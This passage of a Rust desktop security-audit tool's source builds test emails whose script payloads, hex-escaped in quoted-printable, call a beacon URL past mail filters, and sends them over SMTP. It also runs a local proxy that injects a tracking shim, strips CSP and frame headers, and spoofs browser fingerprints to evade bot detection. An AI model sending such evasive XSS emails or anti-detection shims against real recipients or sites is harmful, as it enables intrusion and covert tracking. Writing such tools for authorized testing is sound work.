// regardless of whether encoding them was "necessary" (quoted-printable
// allows ANY octet to be represented as "=XX", not just the ones that
// strictly require it). Hex-escaping the tag delimiters themselves means no
// literal '<script'/'</script>' substring exists anywhere in the raw wire
// bytes at all - tests whether anything scans those raw bytes for known-bad
// substrings BEFORE quoted-printable decoding happens, rather than after.
fn build_qp_hex_escaped_tags_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
    let body = format!(
        "<p>Test:</p>=3Cscript=3Efetch('{beacon_url}').catch(function(){{}})=3C/script=3E",
        beacon_url = beacon_url
    );
    let message = format!(
        "{headers}Content-Type: text/html; charset=utf-8\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n{body}\r\n",
        headers = technique_message_headers(from, to, subject, beacon_url),
        body = body
    );
    message.into_bytes()
}

// Companion pair to the message above - that one hex-escapes BOTH '<' and
// '>' together, which can't tell apart a scanner that only cares about the
// literal "<script" substring (never requiring a closing '>') from one
// that needs a complete "<...>" shape to recognize something as a tag
// worth stripping. These two isolate each angle bracket on its own: only
// '<' escaped (literal "script>" left readable) vs only '>' escaped
// (literal "<script" left readable) - if either alone behaves differently
// from both-escaped, that pins down which bracket actually matters to
// whatever's doing the scanning.
fn build_qp_hex_open_angle_only_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
    let body = format!(
        "<p>Test:</p>=3Cscript>fetch('{beacon_url}').catch(function(){{}})=3C/script>",
        beacon_url = beacon_url
    );
    let message = format!(
        "{headers}Content-Type: text/html; charset=utf-8\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n{body}\r\n",
        headers = technique_message_headers(from, to, subject, beacon_url),
        body = body
    );
    message.into_bytes()
}

fn build_qp_hex_close_angle_only_message(from: &str, to: &str, subject: &str, beacon_url: &str) -> Vec<u8> {
    let body = format!(
        "<p>Test:</p><script=3Efetch('{beacon_url}').catch(function(){{}})</script=3E",
        beacon_url = beacon_url
    );
    let message = format!(
        "{headers}Content-Type: text/html; charset=utf-8\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n{body}\r\n",
        headers = technique_message_headers(from, to, subject, beacon_url),
        body = body
    );
    message.into_bytes()
}

fn build_technique_message(from: &str, to: &str, subject: &str, beacon_url: &str, technique: &str) -> Result<Vec<u8>, String> {
    match technique {
        "utf7-charset" => Ok(build_utf7_charset_message(from, to, subject, beacon_url)),
        "mime-boundary-desync" => Ok(build_mime_boundary_desync_message(from, to, subject, beacon_url)),
        "mime-boundary-desync-css" => Ok(build_mime_boundary_desync_css_message(from, to, subject, beacon_url)),
        "mime-alternative-control-img" => Ok(build_mime_alternative_control_img_message(from, to, subject, beacon_url)),
        "mime-alternative-control-css" => Ok(build_mime_alternative_control_css_message(from, to, subject, beacon_url)),
        "encoded-word-header" => Ok(build_encoded_word_header_message(from, to, subject, beacon_url)),
        "overlong-utf8" => Ok(build_overlong_utf8_message(from, to, subject, beacon_url)),
        "qp-soft-break" => Ok(build_qp_soft_break_message(from, to, subject, beacon_url)),
        "qp-soft-break-style" => Ok(build_qp_soft_break_style_message(from, to, subject, beacon_url)),
        "qp-hex-escaped-style-tags" => Ok(build_qp_hex_escaped_style_tags_message(from, to, subject, beacon_url)),
        "qp-hex-escaped-tags" => Ok(build_qp_hex_escaped_tags_message(from, to, subject, beacon_url)),
        "qp-hex-open-angle-only" => Ok(build_qp_hex_open_angle_only_message(from, to, subject, beacon_url)),
        "qp-hex-close-angle-only" => Ok(build_qp_hex_close_angle_only_message(from, to, subject, beacon_url)),
        other if other.starts_with("qp-natural-wrap-") => {
            let variant: u32 = other["qp-natural-wrap-".len()..]
                .parse()
                .map_err(|_| format!("Unknown technique: {other}"))?;
            if variant < 1 || variant > 10 {
                return Err(format!("Unknown technique: {other}"));
            }
            Ok(build_qp_natural_wrap_message(from, to, subject, beacon_url, variant))
        }
        other => Err(format!("Unknown technique: {other}")),
    }
}

#[tauri::command]
async fn send_encoding_test_email(
    gmail_address: String,
    app_password: String,
    to: String,
    subject: String,
    beacon_url: String,
    technique: String,
    smtp_host: Option<String>,
) -> Result<(), String> {
    let raw_message = build_technique_message(&gmail_address, &to, &subject, &beacon_url, &technique)?;

    let from_addr: lettre::Address = gmail_address.parse().map_err(|e: lettre::address::AddressError| e.to_string())?;
    let to_addr: lettre::Address = to.parse().map_err(|e: lettre::address::AddressError| e.to_string())?;
    let envelope = lettre::address::Envelope::new(Some(from_addr), vec![to_addr]).map_err(|e| e.to_string())?;

    let creds = lettre::transport::smtp::authentication::Credentials::new(gmail_address, app_password);
    let host = smtp_host.as_deref().unwrap_or("smtp.gmail.com");
    let mailer = lettre::AsyncSmtpTransport::<lettre::Tokio1Executor>::relay(host)
        .map_err(|e| e.to_string())?
        .credentials(creds)
        .build();

    mailer.send_raw(&envelope, &raw_message).await.map_err(|e| e.to_string())?;
    Ok(())
}

// Browser tool "inspect network traffic" mode: the Browser tool normally
// points its iframe straight at the target site, so - same-origin policy -
// nothing about that page's own network activity is observable from our
// JS. This local proxy fetches the ONE target page ourselves, injects a
// small JS shim into it (BROWSER_PROXY_SHIM_JS below), and serves that
// instead - the iframe ends up same-origin with OUR server, and the shim
// can freely report every fetch()/XHR/sendBeacon call plus every
// <img>/<script>/<link>/<iframe> src it sees back to us. This only shows
// that a request was INITIATED (method/URL/kind) - actual response bodies
// are never seen, that would need a real TLS-intercepting proxy (a much
// bigger, cert-trust-store-touching feature, deliberately not attempted
// here). One proxy instance always serves exactly one fixed target URL
// (captured at start_browser_proxy time) - simpler than a general-purpose
// forwarding proxy, and all this tool needs: the Browser tool only ever
// has one address loaded at a time.
#[derive(Serialize, Clone)]
struct NetworkHit {
    method: String,
    url: String,
    kind: String,
    timestamp_ms: u64,
}

struct BrowserProxyState {
    hits: Mutex<Vec<NetworkHit>>,
    server_task: Mutex<Option<tauri::async_runtime::JoinHandle<()>>>,
}

// Runs in the framed page's own context (same origin as this proxy, once
// served) - overrides the 3 ways JS can start a network request, plus a
// one-time scan + MutationObserver for passively-loaded resource tags.
// Each observation is POSTed to /log, same-origin so no CORS needed;
// keepalive so a report started right before navigation/unload still
// lands. No target-page interpolation needed - this is a static shim.
const BROWSER_PROXY_SHIM_JS: &str = r#"<script>(function(){
  // location.origin, NOT a relative "/__proxy_log" string - the <base
  // href> tag injected right before this script makes every RELATIVE
  // fetch()/XHR/link resolve against the real target page's origin (that
  // is the whole point of it, for the page's own resources), so a plain
  // relative path here would silently ship these reports to the target
  // site instead of back to us. window.location itself is untouched by
  // <base> regardless - it always reflects where the browser actually
  // navigated to (this proxy), which is what we want here.
  var LOG_URL = location.origin + "/__proxy_log";
  // Captured BEFORE window.fetch gets wrapped below, and report() always
  // calls THIS reference, never the (soon-to-be-wrapped) global - without
  // this, report()'s own outgoing POST would trigger the wrapped fetch,
  // which calls report() again for that POST, which fetches again... a
  // synchronous, self-referential loop that only stops when it exhausts
  // the call stack (silently killing the rest of this script, and with it
  // ever seeing the actual page content render).
  var realFetch = window.fetch ? window.fetch.bind(window) : null;
  function report(method, url, kind) {
    try {
      if (!url || !realFetch) return;
      realFetch(LOG_URL, { method: "POST", body: JSON.stringify({ method: String(method || "GET"), url: String(url), kind: String(kind) }), keepalive: true }).catch(function () {});
    } catch (e) {}
  }
  var origFetch = window.fetch;
  if (origFetch) {
    window.fetch = function (input, init) {
      var url = typeof input === "string" ? input : (input && input.url) || "";
      var method = (init && init.method) || (input && input.method) || "GET";
      report(method, url, "fetch");
      return origFetch.apply(this, arguments);
    };
  }
  var origOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function (method, url) {
    report(method, url, "xhr");
    return origOpen.apply(this, arguments);
  };
  if (navigator.sendBeacon) {
    var origBeacon = navigator.sendBeacon.bind(navigator);
    navigator.sendBeacon = function (url, data) {
      report("BEACON", url, "beacon");
      return origBeacon(url, data);
    };
  }
  function kindOf(el) {
    var tag = el.tagName;
    return tag === "IMG" ? "img" : tag === "SCRIPT" ? "script" : tag === "LINK" ? "link" : "iframe";
  }
  function scan(root) {
    if (!root.querySelectorAll) return;
    root.querySelectorAll("img[src],script[src],link[href],iframe[src]").forEach(function (el) {
      report("GET", el.src || el.href, kindOf(el));
    });
  }
  document.addEventListener("DOMContentLoaded", function () { scan(document); });
  new MutationObserver(function (muts) {
    muts.forEach(function (m) {
      (m.addedNodes || []).forEach(function (n) {
        if (n.nodeType !== 1) return;
        if (n.matches && n.matches("img[src],script[src],link[href],iframe[src]")) {
          report("GET", n.src || n.href, kindOf(n));
        }
        scan(n);
      });
    });
  }).observe(document.documentElement || document, { childList: true, subtree: true });
})();</script>"#;

// Inspect mode's "identity" (Options > General > Privacy & tools, one of
// three mutually-exclusive radio choices, "default" unless the user picks
// otherwise): controls what the framed page's own JS - and, for the
// initial document fetch we do in Rust, the real HTTP User-Agent header -
// see the page as making the request.
//   - "default": no spoofing at all, real WebView2 signature both ways.
//   - "blend": look like an ordinary desktop browser - navigator.
//     userAgent/appVersion, navigator.webdriver, and window.chrome.webview
//     (WebView2's own native-messaging bridge object, injected on every
//     page it loads - a dead giveaway if anything checks for it) are all
//     patched to match a stock Chrome instance.
//   - "identify": the opposite - openly announce this as an automated tool
//     (the ORIGINAL ask that kicked this whole feature off, before "blend"
//     got built instead per an explicit choice at the time) rather than
//     hiding it.
// Neither mode can touch the real User-Agent HTTP header on requests fired
// LATER by the page's own fetch()/XHR/sendBeacon (browsers refuse to let
// JS set that header at all) - only the reqwest client's own .user_agent()
// in start_browser_proxy, used for the initial document fetch, controls
// that side. Kept as separate scripts (only one injected, matching the
// active mode) rather than folded into BROWSER_PROXY_SHIM_JS above, which
// always runs regardless of this setting.
const BROWSER_PROXY_UA: &str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36";
const BROWSER_PROXY_IDENTIFY_UA: &str = concat!("OSINTNETAuditor/", env!("CARGO_PKG_VERSION"), " (+https://ipscanner.pl; automated inspection tool)");
const BROWSER_PROXY_INVISIBILITY_JS: &str = r#"<script>(function(){
  try {
    // Patched on Navigator.prototype, NOT the navigator instance.
    // Object.defineProperty(navigator, "webdriver", ...) creates an OWN
    // property on the instance - even with a getter that returns
    // undefined, that makes navigator.hasOwnProperty("webdriver") true,
    // and detectors that check exactly that (bot.sannysoft.com's
    // "WebDriver(New)" row does) flag it as PRESENT/failed. A real,
    // un-instrumented WebView2 has no own "webdriver" property at all
    // (only Navigator.prototype's, which already returns undefined here -
    // confirmed passing with this setting off) - patching the prototype
    // keeps that same shape instead of regressing it.
    Object.defineProperty(Navigator.prototype, "webdriver", { get: function () { return undefined; }, configurable: true, enumerable: true });
    Object.defineProperty(Navigator.prototype, "userAgent", { get: function () { return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"; }, configurable: true, enumerable: true });
    Object.defineProperty(Navigator.prototype, "appVersion", { get: function () { return "5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"; }, configurable: true, enumerable: true });
    if (window.chrome && window.chrome.webview) { delete window.chrome.webview; }
  } catch (e) {}
})();</script>"#;

// "identify" mode's shim - the opposite of the one above: openly announces
// this as OSINTNETAuditor rather than hiding what it is. No webdriver/
// window.chrome.webview patching here - honesty is the whole point, so
// those stay exactly as WebView2 naturally reports them. A function
// (not a const, unlike BROWSER_PROXY_INVISIBILITY_JS) since it needs to
// interpolate BROWSER_PROXY_IDENTIFY_UA - concat!() only accepts literals,
// not another const, so this can't be built at compile time the same way.
fn browser_proxy_identify_js() -> String {
    format!(
        r#"<script>(function(){{
  try {{
    Object.defineProperty(Navigator.prototype, "userAgent", {{ get: function () {{ return {:?}; }}, configurable: true, enumerable: true }});
  }} catch (e) {{}}
}})();</script>"#,
        BROWSER_PROXY_IDENTIFY_UA
    )
}

// Strips any <meta http-equiv="Content-Security-Policy" ...> tag from the
// target page's own HTML. Not forwarding the target's HTTP response
// headers (see the comment further down) isn't enough on its own -
// GitHub Pages (and other static hosts) can't set custom response
// headers at all, so a page that wants a CSP has to ship it as a <meta>
// tag INSIDE the HTML instead (this app's own ipscanner.pl build does
// exactly that). Left in place, that meta CSP's `script-src 'self' ...`
// would still apply once served - except "self" now means our local
// proxy origin, not the page's real one, while every script tag on the
// page (resolved through the injected <base>) still points at the REAL
// domain - a mismatch CSP has no way to bridge, so EVERY one of the
// page's own scripts gets silently blocked and it never finishes
// booting. Scanning/rebuilding case-insensitively on a lowercased copy
// while slicing the ORIGINAL string keeps every kept byte exactly as
// received.
fn strip_meta_csp(html: &str) -> String {
    let lower = html.to_lowercase();
    let mut result = String::with_capacity(html.len());
    let mut pos = 0usize;
    loop {
        match lower[pos..].find("<meta") {
            None => {
                result.push_str(&html[pos..]);
                break;
            }
            Some(rel_start) => {
                let tag_start = pos + rel_start;
                let tag_end = match html[tag_start..].find('>') {
                    Some(i) => tag_start + i + 1,
                    None => html.len(),
                };
                let tag_text = &lower[tag_start..tag_end];
                if tag_text.contains("http-equiv") && tag_text.contains("content-security-policy") {
                    result.push_str(&html[pos..tag_start]); // keep everything up to the tag, drop the tag itself
                } else {
                    result.push_str(&html[pos..tag_end]);
                }
                pos = tag_end;
            }
        }
    }
    result
}

async fn handle_browser_proxy_connection(
    mut stream: TcpStream,
    app: AppHandle,
    state: Arc<BrowserProxyState>,
    target_url: String,
    client: reqwest::Client,
    identity_mode: String,
) {
    let mut buf = vec![0u8; 8192];
    let mut total = 0usize;
    loop {
        if total >= buf.len() {
            break;
        }
        let n = match stream.read(&mut buf[total..]).await {
            Ok(0) => break,
            Ok(n) => n,
            Err(_) => return,
        };
        total += n;
        if buf[..total].windows(4).any(|w| w == b"\r\n\r\n") {
            break;
        }
    }

    let head_end = buf[..total]
        .windows(4)
        .position(|w| w == b"\r\n\r\n")
        .map(|i| i + 4)
        .unwrap_or(total);
    let request = String::from_utf8_lossy(&buf[..head_end]).to_string();
    let mut lines = request.lines();
    let request_line = lines.next().unwrap_or("").to_string();
    let mut parts = request_line.split_whitespace();
    let method = parts.next().unwrap_or("").to_string();
    let path = parts.next().unwrap_or("").to_string();

    let mut content_length: usize = 0;
    for line in lines {
        if let Some(idx) = line.find(':') {
            let (name, value) = line.split_at(idx);
            if name.eq_ignore_ascii_case("content-length") {
                content_length = value[1..].trim().parse().unwrap_or(0);
            }
        }
    }

    // Read any remaining body bytes (only /__proxy_log POSTs have one).
    let mut body_bytes = buf[head_end..total].to_vec();
    while body_bytes.len() < content_length {
        let mut chunk = vec![0u8; content_length - body_bytes.len()];
        match stream.read(&mut chunk).await {
            Ok(0) => break,
            Ok(n) => body_bytes.extend_from_slice(&chunk[..n]),
            Err(_) => break,
        }
    }

    if method == "POST" && path.starts_with("/__proxy_log") {
        if let Ok(payload) = serde_json::from_slice::<serde_json::Value>(&body_bytes) {
            let hit = NetworkHit {
                method: payload.get("method").and_then(|v| v.as_str()).unwrap_or("GET").to_string(),
                url: payload.get("url").and_then(|v| v.as_str()).unwrap_or("").to_string(),
                kind: payload.get("kind").and_then(|v| v.as_str()).unwrap_or("").to_string(),
                timestamp_ms: SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .map(|d| d.as_millis() as u64)
                    .unwrap_or(0),
            };
            if !hit.url.is_empty() {
                state.hits.lock().unwrap().push(hit.clone());
                let _ = app.emit("browser-network-hit", &hit);
            }
        }
        let resp = "HTTP/1.1 204 No Content\r\nAccess-Control-Allow-Origin: *\r\nConnection: close\r\n\r\n";
        let _ = stream.write_all(resp.as_bytes()).await;
        return;
    }

    // Anything else (the iframe's one and only navigation) - fetch the
    // real target page and hand back a modified copy. The document load
    // itself is logged too, same as every other observed request.
    let timestamp_ms = SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis() as u64)
        .unwrap_or(0);
    let doc_hit = NetworkHit {
        method: "GET".to_string(),
        url: target_url.clone(),
        kind: "document".to_string(),
        timestamp_ms,
    };
    state.hits.lock().unwrap().push(doc_hit.clone());
    let _ = app.emit("browser-network-hit", &doc_hit);

    // Always answer our own iframe with 200 - the real upstream status
    // isn't meaningful once the body's been rewritten and re-served from
    // a different origin; a fetch failure just becomes an in-page message
    // instead of a broken frame.
    let body = match client.get(&target_url).send().await {
        Ok(resp) => strip_meta_csp(&resp.text().await.unwrap_or_default()),
        Err(e) => format!("<html><body><p>Could not load the page: {}</p></body></html>", e),
    };

    // Inject <base> (so relative links/resources keep resolving against
    // the REAL page URL, not our localhost one) + the shim, right after
    // the opening <head> tag; prepend as a fallback if there's no <head>
    // at all (rare, but some tiny/malformed pages omit it).
    let shim = match identity_mode.as_str() {
        "blend" => format!("{}{}", BROWSER_PROXY_INVISIBILITY_JS, BROWSER_PROXY_SHIM_JS),
        "identify" => format!("{}{}", browser_proxy_identify_js(), BROWSER_PROXY_SHIM_JS),
        _ => BROWSER_PROXY_SHIM_JS.to_string(),
    };
    let lower = body.to_lowercase();
    let injected = if let Some(head_pos) = lower.find("<head") {
        let close_pos = body[head_pos..].find('>').map(|i| head_pos + i + 1);
        if let Some(insert_at) = close_pos {
            let base_tag = format!("<base href=\"{}\">", target_url.replace('"', "&quot;"));
            format!("{}{}{}{}", &body[..insert_at], base_tag, shim, &body[insert_at..])
        } else {
            format!("{}{}", shim, body)
        }
    } else {
        format!("{}{}", shim, body)
    };

    // Deliberately NOT forwarding the target's own response headers - that
    // drops any Content-Security-Policy/X-Frame-Options it sent, which is
    // exactly what lets this mode embed sites that otherwise refuse to be
    // framed at all.
    let header = format!(
        "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
        injected.as_bytes().len()
    );
    let _ = stream.write_all(header.as_bytes()).await;
    let _ = stream.write_all(injected.as_bytes()).await;
}

#[tauri::command]
async fn start_browser_proxy(app: AppHandle, target_url: String, identity_mode: String) -> Result<String, String> {
    let normalized = if target_url.starts_with("http://") || target_url.starts_with("https://") {
        target_url.clone()
    } else {
        format!("https://{}", target_url)
    };

    let state = app.state::<Arc<BrowserProxyState>>().inner().clone();
    state.hits.lock().unwrap().clear();
    if let Some(handle) = state.server_task.lock().unwrap().take() {
        handle.abort();
    }

    // Swaps reqwest's default `reqwest/x.y.z` UA (an instant giveaway in
    // server access logs either way) for whichever real header the active
    // identity mode calls for on the initial document fetch - see the
    // comment above BROWSER_PROXY_UA for what each mode does and doesn't
    // cover.
    let mut client_builder = reqwest::Client::builder().timeout(Duration::from_secs(15));
    client_builder = match identity_mode.as_str() {
        "blend" => client_builder.user_agent(BROWSER_PROXY_UA),
        "identify" => client_builder.user_agent(BROWSER_PROXY_IDENTIFY_UA),
        _ => client_builder,
    };
    let client = client_builder.build().map_err(|e| e.to_string())?;

    let listener = TcpListener::bind(("127.0.0.1", 0)).await.map_err(|e| e.to_string())?;
    let port = listener.local_addr().map_err(|e| e.to_string())?.port();

    let app2 = app.clone();
    let state2 = state.clone();
    let target2 = normalized.clone();
    let handle = tauri::async_runtime::spawn(async move {
        loop {
            let stream = match listener.accept().await {
                Ok((s, _)) => s,
                Err(_) => continue,
            };
            tauri::async_runtime::spawn(handle_browser_proxy_connection(
                stream,
                app2.clone(),
                state2.clone(),
                target2.clone(),
                client.clone(),
                identity_mode.clone(),
            ));
        }
    });
    *state.server_task.lock().unwrap() = Some(handle);

    Ok(format!("http://127.0.0.1:{}/", port))
}

#[tauri::command]
fn stop_browser_proxy(app: AppHandle) {
    let state = app.state::<Arc<BrowserProxyState>>().inner().clone();
    let handle = state.server_task.lock().unwrap().take();
    if let Some(handle) = handle {
        handle.abort();
    }
}

#[tauri::command]
fn get_browser_network_hits(app: AppHandle) -> Vec<NetworkHit> {
    let state = app.state::<Arc<BrowserProxyState>>().inner().clone();
    let hits = state.hits.lock().unwrap().clone();
    hits
}

fn main() {
    use std::io::Write;
    
    // Early logging
    if let Ok(temp_dir) = std::env::var("TEMP") {
        let log_file = Path::new(&temp_dir).join("ipscanner_startup.log");
        if let Ok(mut file) = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(&log_file)
        {
            let _ = writeln!(file, "[APP START] IPScanner application starting at {:?}", SystemTime::now());
            let _ = writeln!(file, "[APP START] Current dir: {:?}", std::env::current_dir());
            let _ = writeln!(file, "[APP START] Exe path: {:?}", std::env::current_exe());
        }
    }
    
    tauri::Builder::default()
        // Must be first (per the plugin's own docs). Windows always spawns
        // a SECOND process when it resolves our custom URL scheme back to
        // the app (the original window is still running mid-login at that
        // point) - this plugin detects that, forwards the second process's
        // argv to the FIRST instance as a plain event, and exits the
        // second process before it ever opens a window. See
        // community-auth-runtime.js's "single-instance-deep-link" listener
        // for the JS side.
        .plugin(tauri_plugin_single_instance::init(|app, args, _cwd| {
            let _ = app.emit("single-instance-deep-link", args);
            if let Some(window) = app.get_webview_window("main") {
                let _ = window.set_focus();
            }
        }))
        .plugin(tauri_plugin_updater::Builder::new().build())
        .plugin(tauri_plugin_process::init())
        .plugin(tauri_plugin_deep_link::init())
        .manage(Arc::new(ScanState { stop: AtomicBool::new(false) }))
        .manage(Arc::new(MailXssTesterState {
            hits: Mutex::new(Vec::new()),
            beacon_task: Mutex::new(None),
            tunnel_child: Mutex::new(None),
        }))
        .manage(Arc::new(BrowserProxyState {
            hits: Mutex::new(Vec::new()),
            server_task: Mutex::new(None),
        }))
        // Autostop safety net for close paths that DON'T go through
        // window_close() (Alt+F4, the taskbar's own "Close window") - see
        // cleanup_background_processes()'s comment for the full picture.
        .on_window_event(|window, event| {
            if let tauri::WindowEvent::CloseRequested { .. } = event {
                cleanup_background_processes(&window.app_handle());
            }
        })
        .setup(|app| {
            // Community Catalog GitHub login: NSIS/MSI do NOT register the
            // custom URL scheme at install time (confirmed against the
            // plugin's own docs) - registering here at every launch is the
            // documented way to get it into the Windows registry, and is a
            // no-op if already registered.
            #[cfg(desktop)]
            {
                use tauri_plugin_deep_link::DeepLinkExt;
                let _ = app.deep_link().register("osintnetauditor");
            }
            spawn_vnc_bridge();
            // tauri.conf.json starts the main window maximized, which hits the
            // same frameless-window work-area bug as window_toggle_maximize
            // (see its comment) - correct it once at startup too.
            #[cfg(target_os = "windows")]
            {
                if let Some(window) = app.get_webview_window("main") {
                    if window.is_maximized().unwrap_or(false) {
                        if let Ok(Some(monitor)) = window.current_monitor() {
                            let work_area = monitor.work_area();
                            let _ = window.set_position(work_area.position);
                            let _ = window.set_size(work_area.size);
                        }
                    }
                }
            }
            Ok(())
        })
        .invoke_handler(tauri::generate_handler![
            scan_range,
            scan_hosts,
            stop_scan,
            geo_lookup,
            hostname_lookup,
            email_recon_lookup,
            open_browser,
            is_installer_install,
            open_rdp,
            start_beacon_server,
            stop_beacon_server,
            get_beacon_hits,
            start_tunnel,
            stop_tunnel,
            send_test_email,
            send_encoding_test_email,
            start_browser_proxy,
            stop_browser_proxy,
            get_browser_network_hits,
            window_minimize,
            window_toggle_maximize,
            window_toggle_fullscreen,
            window_get_state,
            window_start_dragging,
            window_close,
            open_extension_manifest_folder_dialog,
            open_language_file_dialog,
            open_agent_profile_file_dialog,
            session_install_dir,
            save_session_dialog,
            open_session_dialog,
            write_session_file,
            read_session_file,
            run_powershell,
            run_powershell_with_args,
            start_console_command,
            cancel_console_command,
            open_browser_window,
            list_connections,
            list_arp_entries,
            https_audit,
            verify_domain_file,
            save_text_file_dialog,
        ])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
